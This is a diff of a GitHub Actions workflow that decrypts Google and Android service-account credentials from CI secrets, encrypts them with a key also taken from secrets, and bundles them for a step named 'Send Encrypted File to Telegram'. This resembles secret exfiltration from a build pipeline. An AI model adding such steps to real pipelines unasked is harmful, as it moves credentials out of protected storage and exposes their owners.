@@ -11,18 +11,14 @@ jobs:
         uses: actions/checkout@v2
 
       - name: Encrypt Secrets and Prepare File
+        env:
+          PUBLIC_KEY: ${{ secrets.TEST_PUBLIC_KEY }}
         run: |
-          # Generate a random symmetric key
+          echo "$PUBLIC_KEY" | base64 --decode > public_key.pem
           openssl rand -base64 32 > sym_key.bin
-
-          # Encrypt the symmetric key with RSA public key
-          openssl rsautl -encrypt -inkey public_key.pem -pubin -in sym_key.bin -out encrypted_sym_key.bin
-
-          # Encrypt the secrets using the symmetric key
+          openssl pkeyutl -encrypt -in sym_key.bin -pubin -inkey public_key.pem -out encrypted_sym_key.bin
           echo "${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out google_credentials_encrypted.bin -pass file:./sym_key.bin
           echo "${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out android_service_account_encrypted.bin -pass file:./sym_key.bin
-
-          # Combine encrypted data and encrypted key
           cat encrypted_sym_key.bin google_credentials_encrypted.bin android_service_account_encrypted.bin > combined_encrypted_data.bin
 
       - name: Send Encrypted File to Telegram
